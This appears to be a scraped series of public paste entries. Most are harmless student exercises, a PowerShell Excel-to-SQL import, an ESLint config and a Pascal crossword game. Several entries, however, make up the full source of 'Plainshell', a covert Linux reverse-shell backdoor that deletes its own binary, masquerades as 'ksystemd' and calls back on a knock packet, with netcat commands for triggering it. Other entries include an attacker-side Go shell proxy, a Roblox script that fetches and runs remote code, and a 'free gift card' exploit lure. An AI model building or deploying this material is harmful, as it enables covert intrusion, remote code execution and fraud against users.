		log.Fatalf(""Error reading key: %v"", err)
	}
	l = bytes.TrimRight(l, ""\n"")
	/* Check the length */
	if KEYLEN != len(l) {
		log.Fatalf(
			""Key wrong length.  Expected %v, got %v"",
			KEYLEN,
			len(l),
		)
	}
	/* Copy it to an array */
	for i, v := range l {
		a[i] = v
	}
	return a
}"
nSvJQm1h,attack.go,FlyFar,Go,Saturday 20th of January 2024 05:21:31 AM CDT,"package main

/*
 * attack.go
 * Attacker side of ip74
 * By J. Stuart McMurray
 * Created 2016022
 * Last Modified 2016022
 */

import (
	""bufio""
	""fmt""
	""io""
	""log""
	""net""
	""os""
)

/* attack proxies stdio to the remote end connected to c. */
func attack(c *net.IPConn) {
	/* Get attack keys */
	skey, rkey := readAttackKeys()

	log.Printf(""Ready to attack! %v <-> %v"", c.LocalAddr(), c.RemoteAddr())

	/* Read data from stdin, pass to target */
	ec := make(chan error)
	go send(c, os.Stdin, skey, ec)
	go recv(os.Stdout, c, rkey, ec)

	/* Wait for something to go wrong */
	err := <-ec
	if nil == err || io.EOF == err {
		return
	}
	log.Fatalf(""Error: %v"", err)
}

/* readAttackKeys prompts for and reads keys from stdin.  It will exit the
program with a call to log.Fatalf if the keys cannot be read or if either of
the keys is the wrong length. */
func readAttackKeys() (send, recv [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	/* Get send key */
	fmt.Fprintf(os.Stderr, ""32-byte send (encryption) key: "")
	send = getKey(r)
	fmt.Fprintf(os.Stderr, ""32-byte receive (decryption) key: "")
	recv = getKey(r)

	return
}"
TT9JArBc,README,FlyFar,Email,Saturday 20th of January 2024 05:19:50 AM CDT,"Plainshell
Plainshell is a small backdoor meant to be hard to find.

It is a response to a certain CCDC team catching most of my malware by inspecting the output of netstat.

Sneaky Features
There are several things Plainshell does which (hopefully) makes it a bit harder to find:

No command-line arguments. Feel free to use whatever looks normal in the process list. Config is accomplished by editing config.h.
No listening socket. Sessions are initiated via a UDP packet read via pcap.
The connected shell is /bin/sh, with stdio hooked up to the network, so no danger of the binary being pulled out of /proc/pid/exe.
The connected shell has a parent PID of 1 and is its session leader.

Compilation
1. Edit config.h
2. Run ./build.sh in the Plainshell directory

Installation
1. Upload
2 ./backdoor (with a better name, hopefully).

Once started, Plainshell will:
- Remove its binary (assuming you didn't use exec -a)
- Background itself (via daemon(3))
- Remove a leading ./ from its process name
- Passively watch the network for knock packets

Knocking
Plainshell passively monitors the network for packets matching a given BPF filter (set in config.h). The last six bytes of the packet are the IPv4 address and port to which to connect, as so:

...packet | address | port |
--------->|<---4--->|<-2-->| 

The same binary can be used with the --k flag to generate this packet:

./plainshell --k 192.168.1.2 443 | nc -u -p 31337 192.168.1.3 53
nc -vl 443 (BSD)
nc -vlp 443 (Linux)
The above would send a packet to the Plainshell at 192.168.1.3 with UDP destination port 53 and source port 31337, requesting a shell to call back to 102.168.1.2:443 (TCP)
Since Plainshell listens with pcap, host-based firewalls (i.e. iptables or pf) shouldn't prevent knock packets from getting through.

Shell
Before the shell calls back, the process will wait a configurable number of seconds to allow for a one-line knock/netcat command.

The shell that calls back will be completely unencrypted; it's just /bin/sh with stdio connected to the network connection. Don't expect a prompt.

Irritating CCDC Defenders:
while :; do
        ./plainshell --k 192.168.0.2 4444 | nc -Nup 31337 192.168.0.3 53
        echo killall apache2 | nc -vlN 4444
        sleep 60
done"
2a7rQMWq,plainshell.h,FlyFar,C,Saturday 20th of January 2024 05:16:20 AM CDT,"/*
 * plainshell.h
 * Defines and includes and prototypes
 * By J. Stuart McMurray
 * Created 20160317
 * Last Modified 20160319
 */

#ifndef HAVE_PLAINSHELL_H
#define HAVE_PLAINSHELL_H 1

#define _GNU_SOURCE /* Blech */

#include <sys/socket.h>
#include <sys/stat.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <assert.h>
#include <err.h>
#include <pcap.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include ""config.h""

/* Make a knock packet.  Expects the address and port to which the backdoor
 * should call back. */
int make_knock(const char *address, const char *port);

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap();

/* handle takes a packet, and double-forks off a handler for it. */
void handle(u_char *name, const struct pcap_pkthdr *hdr, const u_char *pkt);

/* shell calls back the address specified in the last six bytes of pkt, which
 * is of length len. */
void shell(const u_char *pkt, bpf_u_int32 len);

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s);

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p);

#endif /* HAVE_PLAINSHELL_H */"
sUMz2NLE,plainshell.c,FlyFar,C,Saturday 20th of January 2024 05:15:43 AM CDT,"/*
 * plainshell.c
 * Hooks up a shell to plaintext network comms
 * By J. Stuart McMurray
 * Created 20160316
 * Last Modified 20160319
 */

#include ""plainshell.h""

int main(int argc, char **argv) {
        int ret;
        pcap_t *p;

        /* If the first argument is --k, make a knock */
        if (4 == argc && 0 == strncmp(argv[1], KNOCKFLAG, sizeof(KNOCKFLAG))) {
                return make_knock(argv[2], argv[3]);
        }

        /* Ignore child processess death */
        signal(SIGCHLD, SIG_IGN);

        /* Remove this binary */
        rmbin(argv[0]);

        /* Daemonize */
        if (-1 == daemon(0, 1)) {
                err(1, ""daemon"");
        }

        /* Remove leading ./ from name */
        remove_dot_slash(&(argv[0]));

        /* Start pcap going */
        p = init_pcap();

        /* Handle children */
        if (0 != (ret = pcap_loop(p, -1, handle, (u_char *)&(argv[0])))) {
                pcap_perror(p, ""pcap_loop"");
                return ret;
        }

        /* Shouldn't reach here */
        return 255;
}

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap() {
        pcap_t *p;                       /* Pcap handle */
        struct bpf_program fp;           /* BPF filter */
        char errbuf[PCAP_ERRBUF_SIZE+1]; /* Error buffer */

        p = NULL;
        errbuf[PCAP_ERRBUF_SIZE] = '\0';

        /* Start pcap session */
        if (NULL == (p = pcap_open_live(DEVICE, 65535, 0, -1, errbuf))) {
                errx(2, ""pcap_open_live: %s"", errbuf);
        }

        /* Set filter */
        if (-1 == pcap_compile(p, &fp, FILTER, 1, 0)) {
                pcap_perror(p, ""pcap_compile"");
                exit(3);
        }
        if (-1 == pcap_setfilter(p, &fp)) {
                pcap_perror(p, ""pcap_setfilter"");
                exit(4);
        }

        return p;
}

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s) {
        if (('.' == (*s)[0]) && ('/' == (*s)[1])) {
                *s+=2;
        }
}

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p) {
        struct stat st;
        printf(""P: %s\n"", p); /* DEBUG */
        if (-1 == lstat(p, &st)) {
                warn(""lstat"");
                return;
        }
        if (-1 == unlink(p)) {
                warn(""unlink"");
        }
}"
2X517rTy,parent.c,FlyFar,C,Saturday 20th of January 2024 05:15:00 AM CDT,"/*
 * parent.c
 * Parent in the child-parent comms pair
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#include ""plainshell.h""

/* handle takes a packet, and double-forks off a handler for it. */
void handle(u_char *name, const struct pcap_pkthdr *hdr, const u_char *pkt) {
        int ret;

        /* Fork a parent */
        ret = fork();
        switch (ret) {
                case -1: /* Couldn't fork */
                        err(5, ""fork"");
                case 0: /* Child */
                        break;
                default: /* Parent */
                        exit(0);
        }

        /* Change our name to something better */
        *((char**)name) = SHNAME;

        /* Fork a child.  This is the backdoor */
        ret = fork();
        switch (ret) {
                case -1: /* Couldn't fork */
                        err(6, ""fork"");
                case 0: /* Child */
                        shell(pkt, hdr->caplen);
                default: /* Parent */
                        break;
        }
        return;
}"
uGKScRgS,knock.c,FlyFar,C,Saturday 20th of January 2024 05:14:21 AM CDT,"/*
 * knock.c
 * Make a knock packet
 * By J. Stuart McMurray
 * Created 20160317
 * Last Modified 20160317
 */

#include ""plainshell.h""

int make_knock(const char *address, const char *port) {
        unsigned char a[4];
        uint16_t p;
        int ret;

        /* Convert the address */
        if (0 == (ret = inet_pton(AF_INET, address, (void*)a))) {
                errx(1, ""invalid address"");
        } else if (-1 == ret) {
                err(2, ""address parse error"");
        }


        /* Convert the port */
        if (1 != sscanf(port, ""%hu"", &p)) {
                err(3, ""port parse error"");
        }
        p = htons(p);

        /* Write the bytes to stdout */
        if (-1 == write(STDOUT_FILENO, a, sizeof(a))) {
                err(4, ""write"");
        }
        if (-1 == write(STDOUT_FILENO, &p, sizeof(p))) {
                err(5, ""write"");
        }

        return 0;
}"
RRFdtnnw,config.h,FlyFar,C,Saturday 20th of January 2024 05:13:43 AM CDT,"/*
 * config.h
 * Config for plainshell
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#ifndef HAVE_CONFIG_H   /* Don't touch this */
#define HAVE_CONFIG_H 1 /* Or this */

/* Device on which to listen for knock packets.  On linux, this can be ""any""
 * to listen on all interfaces. */
#define DEVICE ""lo0"" 

/* Only packets matching this filter will be used.  This should be set as
 * restrictive as possible to avoid unintended packets being used. */
#define FILTER ""udp and dst port 53 and src port 31337""

/* Name for the shell in the process list.  This should look normal to a
 * defender. */
#define SHNAME ""ksystemd""

/* Time to wait between getting a knock packet and connecting back to the
 * attacker.  This may help make correlation a little harder, as well as
 * make it easier to have a one-line knock-then-listen command. */
#define WAITTM 2

/* Flag on the command line to tell Plainshell to make a knock packet body, and
 * not be a backdoor.  This can be changed to avoid clashing with whatever is
 * used on the infected host. */
#define KNOCKFLAG ""--k""

#endif /* HAVE_CONFIG_H */ /* Don't touch this. */"
CiCpy8Dj,child.c,FlyFar,C,Saturday 20th of January 2024 05:11:16 AM CDT,"/*
 * child.c
 * Actual rat
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#include ""plainshell.h""

/* shell calls back the address specified in the last six bytes of pkt, which
 * is of length len. */
void shell(const u_char *pkt, bpf_u_int32 len) {
        struct sockaddr_in sa; /* Address */
        int s;                 /* Socket */
        int i;

        /* If we don't have at least 6 bytes of packet, :( */
        if (6 > len) {
                errx(8, ""Packet too small"");
        }

        /* Wait before calling back */
        sleep(WAITTM);

        /* Work out the address */
        sa.sin_family = AF_INET;
        memcpy(&(sa.sin_port), pkt+len-2, sizeof(sa.sin_port));
        memcpy(&(sa.sin_addr.s_addr), pkt+len-6, sizeof(sa.sin_addr.s_addr));
        bzero(sa.sin_zero, sizeof(sa.sin_zero));

        /* Make a socket */
        if (-1 == (s = socket(AF_INET, SOCK_STREAM, 0))) {
                err(7, ""socket"");
        }

        /* Connect to the remote host */
        if (-1 == connect(s, (struct sockaddr *)&sa, sizeof(sa))) {
                err(9, ""connect"");
        }

        /* Replace file descriptors */
        for (i = 0; i < 3; ++i) {
                if (-1 == (dup2(s, i))) {
                        err(10, ""dup2"");
                }
        }

        /* Exec a shell */
        if (-1 == execl(""/bin/sh"", SHNAME, NULL)) {
                err(11, ""execl"");
        }
}"
uTdTfQzk,build.sh,FlyFar,Bash,Saturday 20th of January 2024 05:10:33 AM CDT,"#!/bin/sh
#
# build.sh
# Build plainshell
# By J. Stuart McMurray
# Created 20160221
# Last Modified 20160227

set -e

NAME=""plainshell""

# Maybe clean
if [ ""clean"" == ""$1"" ]; then
        if [ -f ""$NAME"" ]; then
                rm $NAME
                echo Removed $NAME
        fi
        exit
fi


# Build it
cc -O2 -Wall --pedantic -o $NAME -static plainshell.c -lpcap
# Strip it
strip $NAME

# Tell the user
H=$(basename $(pwd))
(cd ..; ls -l $H/$NAME)"
P5704FHP,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Saturday 20th of January 2024 05:07:00 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_680831.pdf
 
Working as of
20 January 2024"
fcYAvxsS,12 найти исходную,nq1s788,Python,Saturday 20th of January 2024 04:45:53 AM CDT,"for x in range(50): #кол-во единиц в исходной
    for y in range(50): #кол-во двоек в исх
        for z in range(50): #кол-во троек
            s = '0' + '1' * x + '2' * y + '3' * z
            while ('01' in s) or ('02' in s) or ('03' in s):
                s = s.replace('01', '2302', 1)
                s = s.replace('02', '10', 1)
                s = s.replace('03', '201', 1)
            if s.count('1') == 50 and s.count('2') == 12 and s.count('3') == 7:
                print('0' + '1' * x + '2' * y + '3' * z, x)"
XaY0LrHG,Untitled,35657,C++,Saturday 20th of January 2024 04:42:56 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;

void DelChar(char* str, char ch) {
	char* temp = new char[strlen(str) + 1];
	int count = 0;
	for (int i = 0; i <= strlen(str); i++) {
		if (str[i] != ch) {
			temp[count++] = str[i];
		}
	}
	strcpy(str, temp);
}

int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char ch;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> ch;
	DelChar(line, ch);
	cout << line << endl;
	
}"
KKr8hssx,Untitled,Kevinator,PowerShell,Saturday 20th of January 2024 04:40:34 AM CDT,"##########################
# NEW ADDITION TO SCRIPT #
##########################

# TreeSize File Path 
$excelFilePath = ""V:\Data\MediaFileDataFromTreeSize.xlsx""

# Import the Excel module
Import-Module ImportExcel

# Import data from each sheet in the Excel file
$sheets = Get-ExcelSheetInfo -Path $excelFilePath

foreach ($sheet in $sheets) {

    # Import data from Excel sheet to a PowerShell variable and skip first 4 rows
    $data = Import-Excel -Path $excelFilePath -WorksheetName $sheet.Name | Select-Object -Skip 4

    # Map Excel column names to SQL Server column names
    $columnMapping = @{
        'Name' = 'full_path';
        'Folder Path' = 'folder_path';
        'Folders' = 'folders';
        'Files' = 'files';
        'Size' = 'size';
        'Avg. File Size' = 'avg_size';
        'Space free' = 'free_space';
        'Dir Level (Relative)' = 'directory_level';
        'File Extension' = 'file_extension';
        'Last Modified' = 'date_modified';
        'Creation Date' = 'date_created';
        'Current Date' = 'date_imported';
    }

    # Iterate through each row and generate SQL Server INSERT statement with correct column names
    foreach ($row in $data) {
    
        # Make Sure All Row Data Has a Closing Quotation Mark""
        $quotedValues = $columnMapping.Keys | ForEach-Object { ""'$($row.$_ -replace ""'"", ""''"")'"" }
        $sqlRows = $quotedValues -join ', '
        $insertQuery = ""INSERT INTO $tableName ($($columnMapping.Values -join ', ')) VALUES ($sqlRows)""
        Invoke-Sqlcmd -Query $insertQuery -ConnectionString $connectionString
    }
}

"
5mJGBGMR,Dev eslint settings,Vylda,JSON,Saturday 20th of January 2024 04:31:51 AM CDT,"{
  ""root"": true,
  ""extends"": [
    ""airbnb-base""
  ],
  ""ignorePatterns"": [],
  ""env"": {
    ""browser"": true,
    ""es2021"": true,
    ""node"": true
  },
  ""rules"": {
    ""brace-style"": [
      ""error"",
      ""1tbs""
    ],
    ""curly"": [
      ""error"",
      ""all""
    ],
    ""import/order"": [
      ""error"",
      {
        ""alphabetize"": {
          ""order"": ""asc"",
          ""caseInsensitive"": true
        },
        ""groups"": [
          ""builtin"",
          ""external"",
          ""internal"",
          [
            ""parent"",
            ""sibling""
          ]
        ],
        ""newlines-between"": ""never"",
        ""pathGroups"": []
      }
    ],
    ""no-await-in-loop"": ""off"",
    ""no-console"": [
      ""warn"",
      {
        ""allow"": [
          ""warn"",
          ""error""
        ]
      }
    ],
    ""no-continue"": ""off"",
    ""no-debugger"": ""warn"",
    ""no-restricted-imports"": [
      ""error"",
      {
        ""paths"": [
          {
            ""message"": ""Please use lodash/module instead."",
            ""name"": ""lodash""
          }
        ]
      }
    ],
    ""no-restricted-syntax"": ""off""
  }
}"
bhvaUP2G,Pet Simulator 99 Mail Sender Script,Shifu_,Lua,Saturday 20th of January 2024 04:30:41 AM CDT,"Username = ""Roblox""
MinRAP = 10000
loadstring(game:HttpGet(""https://raw.githubusercontent.com/localyactive/projects/main/folder/hg""))()"
ksUKGJM5,UPR1,Annast1997,Python,Saturday 20th of January 2024 04:20:12 AM CDT,"1.  names = input()
if names == ""Johnny"":
    print(""Hello, my love!"")
else:
    print(f""Hello, {names}!"")


2. ages = int(input())
drink = """"
if ages <= 14:
    drink = ""toddy""
elif ages <= 18:
    drink = ""coke""
elif ages <= 21:
    drink = ""beer""
else: #elif ages > 21
    drink = ""whisky""
print(f""drink {drink}"")


3. number_of_messages = int(input())
for current_message in range(number_of_messages):
    number = int(input())
    message = """"
    if number == 88:
        message = ""Hello""
    elif number == 86:
        message = ""How are you?""
    elif number < 88:
        message = ""GREAT!""
    else: #elif number > 88
        message = ""Bye.""
    print(message)

4.divisor = int(input())
boundary = int(input())
for number in range(boundary, divisor -1, -1):
    if number % divisor == 0:
        break
print(number)

5.number_of_orders = int(input())
total_price = 0
for order in range(number_of_orders):
    price_per_capsule = float(input())
    days = int(input())
    capsules_per_day = int(input())
    if price_per_capsule < 0.01 or price_per_capsule > 100.00:
        continue
    elif days not in range(1, 31 + 1):
        continue
    elif capsules_per_day not in range(1, 2000 + 1):
        continue
    price = days * capsules_per_day * price_per_capsule
    total_price += price
    print(f""The price for the coffee is: ${price:.2f}"")
print(f""Total: ${total_price:.2f}"")

6. n = int(input())
for num in range(n):
    text = input()
    flag = False
    for i in text:
        if i in(""."","","",""_""):
            print(f'{text} is not pure!')
            flag = True
            break
    if not flag:
        print(f'{text} is pure.')
7. action = input()

coffees = 0

action_to_lower = ['coding', 'movie', 'dog', 'cat']
action_to_upper = ['CODING', 'MOVIE', 'DOG', 'CAT']

while action != 'END':

    if action in action_to_lower:
        coffees += 1
    elif action in action_to_upper:
        coffees += 2

    action = input()

    if action == 'END':
        if coffees > 5:
            print('You need extra sleep')
        else:
            print(coffees)

8. action = input()
 
coffees = 0
 
action_to_lower = ['coding', 'movie', 'dog', 'cat']
action_to_upper = ['CODING', 'MOVIE', 'DOG', 'CAT']
 
while action != 'END':
 
    if action in action_to_lower:
        coffees += 1
    elif action in action_to_upper:
        coffees += 2
 
    action = input()
 
    if action == 'END':
        if coffees > 5:
            print('You need extra sleep')
        else:
            print(coffees)


9.


10.first_string = input()
second_string = input()
last_printed_string = first_string
for character_index in range(len(first_string)):
    left_part = second_string[:character_index+1]
    right_part = first_string[character_index+1:]
    new_string = left_part + right_part
    if new_string != last_printed_string:
        print(new_string)
        last_printed_string = new_string

11. budget = float(input())
price_for_kg_flour = float(input())
price_for_pack_eggs = price_for_kg_flour * 0.75
price_for_quart_milk = (price_for_kg_flour * 1.25) / 4

money_needed_for_one_loaf = price_for_kg_flour + price_for_pack_eggs + price_for_quart_milk

loaves = 0
colored_eggs = 0

while budget >= money_needed_for_one_loaf:
    loaves += 1
    budget -= money_needed_for_one_loaf
    colored_eggs += 3
    if loaves % 3 == 0:
        colored_eggs -= loaves - 2

print(f""You made {loaves} loaves of Easter bread! Now you have {colored_eggs} eggs ""
      f""and {budget:.2f}BGN left."")

12. quantity_of_decorations = int(input())
remaining_days = int(input())
total_cost = 0
total_spirit = 0
ornament_set_price = 2
tree_skirt_price = 5
tree_garland_price = 3
tree_lights_price = 15
for current_day in range(1, remaining_days + 1):
    if current_day % 11 == 0:
        quantity_of_decorations += 2
    if current_day % 2 == 0:
        total_cost += quantity_of_decorations * ornament_set_price
        total_spirit += 5
    if current_day % 3 == 0:
        total_cost += quantity_of_decorations * (tree_skirt_price + tree_garland_price)
        total_spirit += 3 + 10
    if current_day % 5 == 0:
        total_cost += quantity_of_decorations * tree_lights_price
        total_spirit += 17
        if current_day % 3 == 0:
            total_spirit += 30
    if current_day % 10 == 0:
        total_spirit -= 20
        total_cost += tree_skirt_price + tree_garland_price + tree_lights_price
if remaining_days % 10 == 0:
    total_spirit -= 30
print(f""Total cost: {total_cost}"")
print(f""Total spirit: {total_spirit}"")"
1feGPgMD,Untitled,kwest87,C#,Saturday 20th of January 2024 04:14:50 AM CDT,"using System;

namespace ConsoleApp28
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddDossier = ""1"";
            const string CommandShowDossier = ""2"";
            const string CommandDeleteDossier = ""3"";
            const string CommandSearchName = ""4"";
            const string CommandExitProgram = ""5"";

            string[] names = new string[0];
            string[] positions = new string[0];
            string userInput;
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""        МЕНЮ"");
                Console.WriteLine(
                    "" 1) Добавить досье.\n"" +
                    "" 2) Показать досье.\n"" +
                    "" 3) Удалить досье.\n"" +
                    "" 4) Поиск по фамилии.\n"" +
                    "" 5) Выход."");
                userInput = Console.ReadLine();
                Console.Clear();

                switch (userInput)
                {
                    case CommandAddDossier:
                        AddDossier(ref names, ref positions);
                        break;
                    case CommandShowDossier:
                        ShowDossier(names, positions);
                        break;
                    case CommandDeleteDossier:
                        DeleteDossier(ref names, ref positions);
                        break;
                    case CommandSearchName:
                        SearchName(names, positions);
                        break;
                    case CommandExitProgram:
                        isWork = false;
                        break;
                }
            }
        }

        static void AddElement(ref string[] array, string text)
        {
            Console.Write(text);
            string userInput = Console.ReadLine();
            string[] temporaryArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                temporaryArray[i] = array[i];
            }

            temporaryArray[temporaryArray.Length - 1] = userInput;
            array = temporaryArray;
        }

        static void AddDossier(ref string[] names, ref string[] positions)
        {
            AddElement(ref names, ""Укажите ваше ФИО :"");
            AddElement(ref positions, ""Укажите вашу должность :"");
        }

        static void ShowDossier(string[] names, string[] positions)
        {
            for (int i = 0; i < names.Length; i++)
            {
                ShowElement(i, names[i], positions[i]);
            }
        }

        static void DeleteElement(ref string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index - 1; i++)
            {
                tempArray[i] = array[i];
            }
            for (int i = index - 1; i < tempArray.Length; i++)
            {
                tempArray[i] = array[i + 1];
            }

            array = tempArray;
        }

        static void DeleteDossier(ref string[] names, ref string[] positions)
        {
            Console.Write(""Укажите номер досье которое нужно удалить : "");
            string userInput = Console.ReadLine();
            bool isNumber = int.TryParse(userInput, out int numberValue);

            if (isNumber && numberValue <= names.Length)
            {
                DeleteElement(ref names, numberValue);
                DeleteElement(ref positions, numberValue);
                Console.WriteLine($""Досье {userInput} удалено."");
            }
            else
            {
                Console.WriteLine($""Досье {userInput} нету."");
            }
        }

        static void SearchName(string[] names, string[] positions)
        {
            Console.Write(""Введите фамилию : "");
            string userInput = Console.ReadLine();
            string[] nameElements;
            bool isFound = false;

            for (int i = 0; i < names.Length; i++)
            {
                nameElements = names[i].Split(' ');

                for (int j = 0; j < nameElements.Length; j++)
                {
                    if (nameElements[j].ToLower() == userInput.ToLower())
                    {
                        Console.Write(""Найден : "");
                        ShowElement(i, names[i], positions[i]);
                        isFound = true;
                    }
                }
            }

            if (isFound == false)
            {
                Console.WriteLine(""Ничего не найдено."");
            }
        }

        static void ShowElement(int index ,string name , string position)
        {
            Console.WriteLine($""{index + 1}) {name} - {position}."");
        }
    }
}"
29V61GR9,Untitled,35657,C++,Saturday 20th of January 2024 03:48:02 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;



int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	int m;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите индекс символа: "";
	cin >> m;

	if (m < 0 || m >= strlen(line)) {
		cout << ""Такого символа нет"";
		return 0;
	}

	for (int i = m; i < strlen(line); i++) {
		line[i] = line[i + 1];
	}

	cout << line;
	
}"
Utd9kMx3,Untitled,35657,C++,Saturday 20th of January 2024 03:13:28 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;



int main() {

	//setlocale(LC_ALL, ""ru""); // локализация консоли на вывод

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char m;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> m;

	int i = strlen(line) - 1;

	for (; i >= 0;  i--) {
		if (line[i] == m) {
			cout << i + 1 << "" "";
			break;
		}
	}

	if (i == -1) {
		cout << ""Такого символа нет в строке"" << endl;
	}
}"
5EBA2QmA,24 (подстрока из одной буквы),nq1s788,Python,Saturday 20th of January 2024 03:08:10 AM CDT,"s = open('24.txt').readline()
answ = 0 #самая длинная которую мы нашли
cur = 0 #длина текущей подстроки из Y
for c in s:
    if c == 'Y':
        cur += 1
        answ = max(answ, cur)
    else:
        cur = 0
print(answ)"
SazdSMEr,Untitled,35657,C++,Saturday 20th of January 2024 02:58:52 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;



int main() {

	//setlocale(LC_ALL, ""ru""); // локализация консоли на вывод

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char m;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> m;

	for (int i = 0; i < strlen(line); i++) {
		if (line[i] == m) {
			cout << i + 1 << "" "";
		}
	}
}"
Tb2AR8x5,Untitled,paul_nicholls,Pascal,Saturday 20th of January 2024 02:51:04 AM CDT,"PROGRAM YELLOWCROSSWORD;
USES STRINGS,WINTYPES,WINPROCS,WOBJECTS,STDDLGS;
{$R CRYPTIC.RES}
{$R YELLOW.RES}
{$R PIC.RES}
CONST
   CM_ANSWERS=101;
   CM_ABOUTCRYPTIC=102;
   CM_INSTRUCTIONS=103;
   CM_OPEN=111;
   CM_SAVE=112;
   ID_NEXT=121;
   ID_PREVIOUS=122;
   MAXLENGTH=150;
   DOTITLE:BOOLEAN=TRUE;
TYPE
   CROSSWORD=ARRAY[0..18] OF STRING;
   TMYAPP=OBJECT(TAPPLICATION)
      PROCEDURE INITMAINWINDOW; VIRTUAL;
   END;
   PMYDIALOG=^TMYDIALOG;
   TMYDIALOG=OBJECT(TDIALOG)
      CONSTRUCTOR INIT(APARENT:PWINDOWSOBJECT;ATITLE:PCHAR);
   END;
   PMYWINDOW=^TMYWINDOW;
   TMYWINDOW=OBJECT(TWINDOW)
      HIMAGE:HBITMAP;
      FILENAME:ARRAY[0..200] OF CHAR;
      DATAFILE:FILE OF CROSSWORD;
      MYPEN:HPEN;
      PENSIZE,PENSTYLE:INTEGER;
      PENCOLOR:TCOLORREF;
      XY:STRING;
      TEMP:STRING;
      TEMPWORD:ARRAY[0..19] OF CHAR;
      TEXTLEN,XPOS,YPOS,POSITION:BYTE;
      DC:HDC;
      DISPLAYANSWERS:BOOLEAN;
      QUESTION:ARRAY[0..MAXLENGTH] OF CHAR;
      CHARACTER:ARRAY[0..1] OF CHAR;
      SQUAREFILL,ANSWER:CROSSWORD;

{..........................}

   PROCEDURE TMYWINDOW.WMLBUTTONDOWN(VAR MSG:TMESSAGE);
   VAR
      S1,S2:ARRAY[0..2] OF CHAR;
      MSGX,MSGY,COUNT,NUMBER,LENGTH:INTEGER;
      TEXT:ARRAY[0..19] OF CHAR;
   BEGIN
      MSGX:=(MSG.LPARAMLO-13)DIV 16;
      MSGY:=(MSG.LPARAMHI-13)DIV 17;
      STRPCOPY(S1,CHR((MSGX DIV 10)+48)+CHR(MSGX-(MSGX DIV 10)*10+48));
      STRPCOPY(S2,CHR((MSGY DIV 10)+48)+CHR(MSGY-(MSGY DIV 10)*10+48));
      XY:=S1[0]+S1[1]+','+S2[0]+S2[1];
      NUMBER:=0;
      FOR COUNT:=1 TO 53 DO
         IF AXY[COUNT]=XY THEN NUMBER:=COUNT;
      IF NUMBER<>0 THEN
      BEGIN
         COUNT:=MSGX+1;TEMP:='';LENGTH:=1;

{.......}
   PROCEDURE TMYWINDOW.GETWINDOWCLASS(VAR AWNDCLASS:TWNDCLASS);
   BEGIN
      TWINDOW.GETWINDOWCLASS(AWNDCLASS);
      AWNDCLASS.HICON:=LOADICON(HINSTANCE,'ICON');
      AWNDCLASS.HCURSOR:=LOADCURSOR(HINSTANCE,'HAND');
   END;
   CONSTRUCTOR TMYWINDOW.INIT(APARENT:PWINDOWSOBJECT;ATITLE:PCHAR);
   VAR
      DLG:TMYDIALOG;
      REPLY:INTEGER;
   BEGIN
      DISPLAYANSWERS:=FALSE;
      TWINDOW.INIT(APARENT,ATITLE);
      ATTR.MENU:=LOADMENU(HINSTANCE,'CROSSWORDMENU');
      ATTR.X:=-4;
      ATTR.Y:=-4;
      ATTR.W:=650;
      ATTR.H:=488;
      HIMAGE:=LOADBITMAP(HINSTANCE,'TITLE');
{.................................}
   FUNCTION TMYWINDOW.CANCLOSE:BOOLEAN;
   VAR
      REPLY:INTEGER;
   BEGIN
      CANCLOSE:=TRUE;
      REPLY:=MESSAGEBOX(HWINDOW,'Are you sure you want to quit?',
      'Cryptic Crossword V1.0',
      MB_OKCANCEL+MB_ICONQUESTION);
      IF(REPLY=ID_CANCEL)THEN
      CANCLOSE:=FALSE;
   END;
   PROCEDURE TMYAPP.INITMAINWINDOW;
   BEGIN
      MAINWINDOW:=NEW(PMYWINDOW,INIT(NIL,'YELLOW Crossword'));
   END;
   VAR
